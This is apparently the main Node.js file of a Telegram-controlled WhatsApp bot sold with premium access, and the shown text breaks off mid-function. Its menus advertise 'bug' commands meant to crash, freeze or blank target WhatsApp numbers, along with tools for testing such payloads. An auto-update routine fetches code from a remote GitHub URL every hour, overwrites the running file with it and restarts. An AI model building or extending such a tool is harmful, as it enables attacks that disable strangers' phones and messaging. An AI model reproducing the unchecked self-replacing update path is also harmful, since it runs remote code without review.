const {
    default: makeWASocket,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    DisconnectReason,
} = require('@denzz221/baileys');
const fs = require("fs-extra");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const vm = require('vm');
const config = require("./setting/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";

// Konfigurasi GitHub Auto Update
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
const CURRENT_VERSION = "3.0.9";
const AUTO_UPDATE_FILE = "./database/auto_update.json";

// Load auto update setting
let autoUpdateEnabled = true;

function loadAutoUpdateSetting() {
    try {
        if (!fs.existsSync(AUTO_UPDATE_FILE)) {
            fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled: true }, null, 2));
            return { enabled: true };
        }
        return JSON.parse(fs.readFileSync(AUTO_UPDATE_FILE));
    } catch (error) {
        console.error("Error loading auto update setting:", error);
        return { enabled: true };
    }
}

function saveAutoUpdateSetting(enabled) {
    try {
        fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled: enabled }, null, 2));
    } catch (error) {
        console.error("Error saving auto update setting:", error);
    }
}

// Inisialisasi auto update setting
const autoUpdateSetting = loadAutoUpdateSetting();
autoUpdateEnabled = autoUpdateSetting.enabled;

// File untuk menyimpan data
const GROUP_PREMIUM_FILE = "./database/group_premium.json";
const BLOCKED_COMMANDS_FILE = "./database/blocked_commands.json";
const COLOR_SETTING_FILE = "./database/color_setting.json";

// Load data grup premium
let groupPremiumData = [];

function loadGroupPremiumData() {
    try {
        if (!fs.existsSync(GROUP_PREMIUM_FILE)) {
            fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync(GROUP_PREMIUM_FILE));
    } catch (error) {
        console.error("Error loading group premium data:", error);
        return [];
    }
}

function saveGroupPremiumData(data) {
    try {
        fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error("Error saving group premium data:", error);
    }
}

// Load blocked commands
let blockedCommands = [];

function loadBlockedCommands() {
    try {
        if (!fs.existsSync(BLOCKED_COMMANDS_FILE)) {
            fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE));
    } catch (error) {
        console.error("Error loading blocked commands:", error);
        return [];
    }
}

function saveBlockedCommands(commands) {
    try {
        fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(commands, null, 2));
    } catch (error) {
        console.error("Error saving blocked commands:", error);
    }
}

// Load color setting
let currentColor = "disco";

function loadColorSetting() {
    try {
        if (!fs.existsSync(COLOR_SETTING_FILE)) {
            fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: "disco" }, null, 2));
            return { color: "disco" };
        }
        return JSON.parse(fs.readFileSync(COLOR_SETTING_FILE));
    } catch (error) {
        console.error("Error loading color setting:", error);
        return { color: "disco" };
    }
}

function saveColorSetting(color) {
    try {
        fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: color }, null, 2));
    } catch (error) {
        console.error("Error saving color setting:", error);
    }
}

// Inisialisasi data
groupPremiumData = loadGroupPremiumData();
blockedCommands = loadBlockedCommands();
const colorSetting = loadColorSetting();
currentColor = colorSetting.color;

// Fungsi untuk mengecek update dari GitHub
async function checkForUpdates() {
    try {
        console.log(chalk.cyan("🔍 Mengecek update dari GitHub..."));
        const response = await axios.get(GITHUB_RAW_URL, { timeout: 10000 });
        const remoteContent = response.data;
        
        const remoteVersionMatch = remoteContent.match(/CURRENT_VERSION = "([^"]+)"/);
        const remoteVersion = remoteVersionMatch ? remoteVersionMatch[1] : "unknown";
        
        if (remoteVersion !== CURRENT_VERSION) {
            console.log(chalk.yellow(`📦 Update tersedia! Versi ${CURRENT_VERSION} → ${remoteVersion}`));
            return { hasUpdate: true, newVersion: remoteVersion, content: remoteContent };
        }
        
        console.log(chalk.green("✅ Bot sudah versi terbaru!"));
        return { hasUpdate: false };
    } catch (error) {
        console.error(chalk.red("❌ Gagal mengecek update:", error.message));
        return { hasUpdate: false, error: error.message };
    }
}

// Fungsi untuk melakukan update
async function performUpdate(chatId) {
    try {
        const update = await checkForUpdates();
        
        if (!update.hasUpdate) {
            if (chatId) {
                await bot.sendMessage(chatId, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
            }
            return false;
        }
        
        fs.writeFileSync(__filename, update.content);
        console.log(chalk.green("✅ File index.js berhasil diupdate!"));
        
        if (chatId) {
            await bot.sendMessage(chatId, `✅ Update berhasil! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Bot akan restart dalam 3 detik...`);
        }
        
        setTimeout(() => {
            process.exit(0);
        }, 3000);
        
        return true;
    } catch (error) {
        console.error(chalk.red("❌ Gagal update:", error.message));
        if (chatId) {
            await bot.sendMessage(chatId, `❌ Gagal update: ${error.message}`);
        }
        return false;
    }
}

// Auto update checker
let autoUpdateInterval = null;

function startAutoUpdateChecker() {
    if (autoUpdateInterval) {
        clearInterval(autoUpdateInterval);
    }
    
    autoUpdateInterval = setInterval(async () => {
        if (!autoUpdateEnabled) return;
        
        console.log(chalk.cyan("🔄 Auto update check..."));
        const update = await checkForUpdates();
        
        if (update.hasUpdate) {
            console.log(chalk.yellow(`📦 Auto update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}`));
            await performUpdate(null);
        }
    }, 60 * 60 * 1000);
}

function stopAutoUpdateChecker() {
    if (autoUpdateInterval) {
        clearInterval(autoUpdateInterval);
        autoUpdateInterval = null;
    }
}

function startBot() {
  console.log(chalk.red(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
`));

console.log(chalk.red(`
Informasi:
Dev : t.me/ItsMeXanderRzMd
Channel : https://t.me/allteamlinux
Version: ${CURRENT_VERSION}
Auto Update: ${autoUpdateEnabled ? "ON" : "OFF"}
`));

console.log(chalk.blue(`
[ 🚀 BOT BERJALAN... ]
`));
};

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessionsList = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessionsList.push(...existing, botNumber);
      } else {
        sessionsList.push(...existing);
      }
    } else {
      sessionsList.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
          keepAliveIntervalMs: 30000,
          connectTimeoutMs: 60000,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                setTimeout(() => initializeWhatsAppConnections(), 5000);
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
    keepAliveIntervalMs: 30000,
    connectTimeoutMs: 60000,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        setTimeout(() => ConnectToWhatsApp(botNumber, chatId), 5000);
      } else {
        await bot.editMessageText(
          `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await sleep(1000);
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          let customcode = "PRIMROSE123"
          const code = await sock.requestPairingCode(botNumber, customcode);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await bot.editMessageText(
            `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Code Pairing : ${formattedCode}
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
          });
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

let premiumUsers = [];
let adminUsers = [];

ensureFileExists("./database/premium.json");
ensureFileExists("./database/admin.json");

try {
  premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
  adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));
} catch (error) {
  premiumUsers = [];
  adminUsers = [];
}

function savePremiumUsers() {
  fs.writeFileSync("./database/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./database/admin.json", JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error watching file:`, error);
      }
    }
  });
}

watchFile("./database/premium.json", (data) => (premiumUsers = data));
watchFile("./database/admin.json", (data) => (adminUsers = data));

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

function getRandomImage() {
  return "https://files.catbox.moe/n5forg.jpg";
}

// Fungsi untuk membuat stiker BRAT
async function createBratSticker(text) {
    try {
        const apiUrl = `https://api.popcat.xyz/brat?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        return Buffer.from(response.data);
    } catch (error) {
        console.error("Error creating brat sticker:", error.message);
        return null;
    }
}

const buttonIntervals = new Map()
let globalIntervalId = null
let globalMessageId = null
let globalChatId = null
let discoActive = false
let currentStyleIndex = 0
const buttonStyles = ["primary", "success", "danger"]

function getButtonStyle(color) {
    switch(color) {
        case "danger": return "danger";
        case "primary": return "primary";
        case "success": return "success";
        case "secondary": return undefined;
        case "disco": return "disco";
        default: return undefined;
    }
}

function getColorFromChoice(choice) {
    switch(choice) {
        case "XRED": return "danger";
        case "XBLUE": return "primary";
        case "XGREEN": return "success";
        case "XWHITE": return "secondary";
        case "XDISCO": return "disco";
        default: return currentColor;
    }
}

async function sendColoredMenu(chatId, from, color) {
  const userId = from.id
  const randomImage = getRandomImage()
  const runtimeStatus = formatRuntime()
  const memoryStatus = formatMemory()
  const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
  const botNumber = sessions.size

  const isWhite = (color === "secondary")
  const buttonStyle = isWhite ? undefined : (color === "disco" ? buttonStyles[0] : color)
  
  let keyboard = [
    [
      {
        text: "XBUGS",
        callback_data: "trashmenu",
        style: buttonStyle
      },
      {
        text: "XTOOLSBUG",
        callback_data: "toolsbug_menu",
        style: buttonStyle
      }
    ],
    [
      {
        text: "XSETTINGS",
        callback_data: "owner_menu",
        style: buttonStyle
      },
      {
        text: "XGROUPSECURITY",
        callback_data: "group_security_menu",
        style: buttonStyle
      }
    ],
    [
      {
        text: "XCHANGECOLOR",
        callback_data: "change_color_menu",
        style: buttonStyle
      },
      {
        text: "DEVELOPERS",
        url: "https://t.me/ItsMeXanderRzMd",
        style: buttonStyle
      }
    ]
  ]

  if (isWhite) {
    keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''))
  }

  const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟    
😄 Owner : @realmarz 🌟
🍽 Version : 3.0 
🗡 Platform : Telegram
<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
⛧ Status : ${status}
⛧ Number : ${botNumber}
⛧ Runtime : ${runtimeStatus}
⛧ Memory : ${memoryStatus}`

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })

  const messageId = sent.message_id
  globalMessageId = messageId
  globalChatId = chatId
  currentStyleIndex = 0

  if (globalIntervalId) {
    clearInterval(globalIntervalId)
  }

  if (color === "disco") {
    discoActive = true
    globalIntervalId = setInterval(async () => {
      if (!discoActive) return
      
      currentStyleIndex = (currentStyleIndex + 1) % buttonStyles.length
      const newStyle = buttonStyles[currentStyleIndex]

      let newKeyboard = [
        [
          {
            text: "XBUGS",
            callback_data: "trashmenu",
            style: newStyle
          },
          {
            text: "XTOOLSBUG",
            callback_data: "toolsbug_menu",
            style: newStyle
          }
        ],
        [
          {
            text: "XSETTINGS",
            callback_data: "owner_menu",
            style: newStyle
          },
          {
            text: "XGROUPSECURITY",
            callback_data: "group_security_menu",
            style: newStyle
          }
        ],
        [
          {
            text: "XCHANGECOLOR",
            callback_data: "change_color_menu",
            style: newStyle
          },
          {
            text: "DEVELOPERS",
            url: "https://t.me/ItsMeXanderRzMd",
            style: newStyle
          }
        ]
      ]

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: newKeyboard },
          {
            chat_id: chatId,
            message_id: messageId
          }
        )
      } catch (e) {
        if (e.response && e.response.statusCode === 400) {
          clearInterval(globalIntervalId)
          globalIntervalId = null
          discoActive = false
        }
      }
    }, 1500)
  } else {
    discoActive = false
    globalIntervalId = null
  }

  buttonIntervals.set(messageId, globalIntervalId)
}

async function sendStartMenu(chatId, from) {
  await sendColoredMenu(chatId, from, currentColor)
}

function stopDiscoEffect() {
  discoActive = false
  if (globalIntervalId) {
    clearInterval(globalIntervalId)
    globalIntervalId = null
  }
}

function isPremium(userId) {
  const user = premiumUsers.find(u => u.id === userId)
  if (!user) return false
  if (user.expiresAt === "permanent") return true
  return Date.now() < user.expiresAt
}

function isCommandBlocked(commandName) {
  return blockedCommands.includes(commandName.toLowerCase());
}

async function addGroupPremium(chatId, days, userId) {
  const chat = await bot.getChat(chatId);
  const groupId = chatId.toString();
  const groupTitle = chat.title;
  
  const existingGroup = groupPremiumData.find(g => g.groupId === groupId);
  const expiresAt = Date.now() + (days * 24 * 60 * 60 * 1000);
  
  if (existingGroup) {
    existingGroup.expiresAt = expiresAt;
    existingGroup.updatedBy = userId;
    existingGroup.updatedAt = Date.now();
  } else {
    groupPremiumData.push({
      groupId: groupId,
      groupTitle: groupTitle,
      addedBy: userId,
      addedAt: Date.now(),
      expiresAt: expiresAt,
      members: []
    });
  }
  
  saveGroupPremiumData(groupPremiumData);
  return true;
}

function removeGroupPremium(chatId) {
  const groupId = chatId.toString();
  groupPremiumData = groupPremiumData.filter(g => g.groupId !== groupId);
  saveGroupPremiumData(groupPremiumData);
  return true;
}

async function addMemberPremiumFromGroup(chatId, userId, username, days) {
  const groupId = chatId.toString();
  const group = groupPremiumData.find(g => g.groupId === groupId);
  
  if (!group) return false;
  
  const expiresAt = Date.now() + (days * 24 * 60 * 60 * 1000);
  const existingMember = group.members.find(m => m.userId === userId);
  
  if (existingMember) {
    existingMember.expiresAt = expiresAt;
    existingMember.username = username;
  } else {
    group.members.push({
      userId: userId,
      username: username,
      addedAt: Date.now(),
      expiresAt: expiresAt
    });
  }
  
  const existingPremium = premiumUsers.find(u => u.id === userId);
  if (!existingPremium) {
    premiumUsers.push({ id: userId, expiresAt: expiresAt });
  } else {
    existingPremium.expiresAt = expiresAt;
  }
  savePremiumUsers();
  
  saveGroupPremiumData(groupPremiumData);
  return true;
}

const pendingColorPoll = {};

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id
  const from = msg.from
  const userId = from.id
  const chatType = msg.chat.type
  const isGroup = chatType === "group" || chatType === "supergroup"
  const isOwnerUser = config.OWNER_ID.includes(String(userId))

  if (!isGroup && !isPremium(userId) && !isOwnerUser) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.")
  }

  await sendStartMenu(chatId, from)
})

bot.on("callback_query", async (query) => {
  if (!query.message) return

  const chatId = query.message.chat.id
  const userId = query.from.id
  const messageId = query.message.message_id
  const data = query.data

  if (buttonIntervals.has(messageId)) {
    clearInterval(buttonIntervals.get(messageId))
    buttonIntervals.delete(messageId)
  }

  if (globalIntervalId) {
    clearInterval(globalIntervalId)
    globalIntervalId = null
  }
  
  discoActive = false

  await bot.deleteMessage(chatId, messageId).catch(()=>{})

  let caption = ""
  let replyMarkup = {}
  let selectedImage = getRandomImage()

  if (data === "trashmenu") {
    caption = `<blockquote>─━━─━━⧼ BUG MENU ⧽─━━─━━</blockquote>
<b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>
🎩 Pemilik : @ItsMeXanderRzMd 🌟    
😄 Owner : @realmarz 🌟
🍽 Version : 3.0
🗡 Platform : Telegram
<b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>
─▢ /sendbug +628
─▢ /clear +628
<b>╰➤ hapus bug</b>
<b>─━━─━━⧼ BUG MENU ⧽─━━─━━:</b>
# Primrose Linux Bot 𖣂
─▢ /Xploit 
<b>╰➤ blank hard</b>
─▢ /Sanjiva
<b>╰➤ delay hard murbug</b>
─▢ /Stova 
<b>╰➤ new delay brutality murbug</b>
─▢ /Chatms +628
<b>╰➤ crash hard</b>
─▢ /Ganesha +628
<b>╰➤ Buldo hard</b>
<pre>──────────────────────────
   MENU: Pilih Fitur Bug Menu di Atas 
──────────────────────────</pre>`
    replyMarkup = {
      inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]]
    }
  } else if (data === "owner_menu") {
    caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟    
😄 Owner : @realmarz 🌟
🍽 Version : 3.0
🗡 Platform : Telegram     
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      ▢ /addprem &lt;user_id&gt;
┃      ╰➤ Menambahkan premium user
┃      ▢ /delprem &lt;user_id&gt;
┃      ╰➤ Menghapus premium user
┃      ▢ /addadmin &lt;user_id&gt;
┃      ╰➤ Menambahkan admin
┃      ▢ /deladmin &lt;user_id&gt;
┃      ╰➤ Menghapus admin
┃      ▢ /listprem
┃      ╰➤ Melihat list premium user
┃      ▢ /listadmin
┃      ╰➤ Melihat list admin
┃      ▢ /reqpair ☇ Number
┃      ╰➤ Menambah Sender WhatsApp
┃      ▢ /update on/off
┃      ╰➤ Mengaktifkan/menonaktifkan auto update
┃      ▢ /autoupdate
┃      ╰➤ Update manual dari GitHub
┃      ▢ /checkupdate
┃      ╰➤ Cek versi terbaru
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>NOTE:</b>
Baca dengan teliti Jangan asal ngetik untuk mendapatkan akses</blockquote>`
    replyMarkup = {
      inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]]
    }
  } else if (data === "group_security_menu") {
    caption = `<blockquote><b>🔒 XGROUPSECURITY MENU 🔒</b></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      ▢ /blokcmd &lt;command&gt;
┃      ╰➤ Mem-block command bug
┃      ▢ /bukacmd &lt;command&gt;
┃      ╰➤ Membuka block command bug
┃      ▢ /addpremgrup &lt;hari&gt;
┃      ╰➤ Menambah grup ke premium (gunakan di grup)
┃      ▢ /delpremgrup
┃      ╰➤ Menghapus grup dari premium
┃      ▢ /listpremgrub
┃      ╰➤ Menampilkan member premium dalam grup
┃      ▢ /add (ketik "add" di grup premium)
┃      ╰➤ Menambah diri sebagai premium user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>NOTE:</b>
Command hanya bisa digunakan oleh admin grup</blockquote>`
    replyMarkup = {
      inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]]
    }
  } else if (data === "toolsbug_menu") {
    caption = `<blockquote><b>🛠️ XTOOLSBUG MENU 🛠️</b></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      ▢ /testfunction &lt;number&gt; &lt;jumlah&gt;
┃      ╰➤ Reply dengan function bug
┃      ▢ /celahfunc &lt;reply func atau file&gt;
┃      ╰➤ Extract celah dari function
┃      ▢ /check &lt;reply code atau file&gt;
┃      ╰➤ Cek error JavaScript
┃      ▢ /fix &lt;reply code&gt;
┃      ╰➤ Perbaiki code JavaScript otomatis
┃      ▢ /brat &lt;kata-kata&gt;
┃      ╰➤ Buat stiker BRAT dari teks
┃      ▢ /tourl &lt;reply foto atau vidio&gt;
┃      ╰➤ Buat link dari foto atau vidio
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>NOTE:</b>
Gunakan tools ini untuk testing dan debugging</blockquote>`
    replyMarkup = {
      inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]]
    }
  } else if (data === "change_color_menu") {
    const options = ["🔴 XRED", "🔵 XBLUE", "🟢 XGREEN", "⚪ XWHITE", "🌈 XDISCO"]
    
    const poll = await bot.sendPoll(chatId, "🎨 PILIH WARNA BUTTON", options, { 
      is_anonymous: false,
      allows_multiple_answers: false
    })
    
    pendingColorPoll[poll.poll.id] = {
      chatId: chatId,
      userId: userId,
      from: query.from
    }
    
    return await bot.answerCallbackQuery(query.id)
  } else if (data === "back_to_main") {
    await sendStartMenu(chatId, query.from)
    return await bot.answerCallbackQuery(query.id)
  }

  if (caption !== "") {
    await bot.sendPhoto(chatId, selectedImage, {
      caption: caption,
      parse_mode: "HTML",
      reply_markup: replyMarkup
    })
  }

  await bot.answerCallbackQuery(query.id)
})

bot.on("poll_answer", async (answer) => {
  const pollData = pendingColorPoll[answer.poll_id]
  if (!pollData) return
  
  const selectedOption = answer.option_ids[0]
  let selectedColor = ""
  
  if (selectedOption === 0) selectedColor = "XRED"
  else if (selectedOption === 1) selectedColor = "XBLUE"
  else if (selectedOption === 2) selectedColor = "XGREEN"
  else if (selectedOption === 3) selectedColor = "XWHITE"
  else if (selectedOption === 4) selectedColor = "XDISCO"
  
  const colorValue = getColorFromChoice(selectedColor)
  saveColorSetting(colorValue)
  currentColor = colorValue
  
  await sendColoredMenu(pollData.chatId, pollData.from, colorValue)
  
  delete pendingColorPoll[answer.poll_id]
})

// ================= FITUR AUTOUPDATE ================= //

bot.onText(/\/update (on|off)/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const mode = match[1].toLowerCase()
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  if (mode === "on") {
    autoUpdateEnabled = true;
    saveAutoUpdateSetting(true);
    startAutoUpdateChecker();
    await bot.sendMessage(chatId, `✅ Auto update diaktifkan! Bot akan otomatis update ketika ada versi baru di GitHub.`);
  } else if (mode === "off") {
    autoUpdateEnabled = false;
    saveAutoUpdateSetting(false);
    stopAutoUpdateChecker();
    await bot.sendMessage(chatId, `❌ Auto update dinonaktifkan! Gunakan /autoupdate untuk update manual.`);
  }
})

bot.onText(/\/autoupdate/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const statusMsg = await bot.sendMessage(chatId, "🔄 Mengecek update dari GitHub...")
  
  const update = await checkForUpdates()
  
  if (!update.hasUpdate) {
    await bot.editMessageText(`✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`, {
      chat_id: chatId,
      message_id: statusMsg.message_id
    })
    return
  }
  
  await bot.editMessageText(`📦 Update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Melakukan update...`, {
    chat_id: chatId,
    message_id: statusMsg.message_id
  })
  
  await performUpdate(chatId)
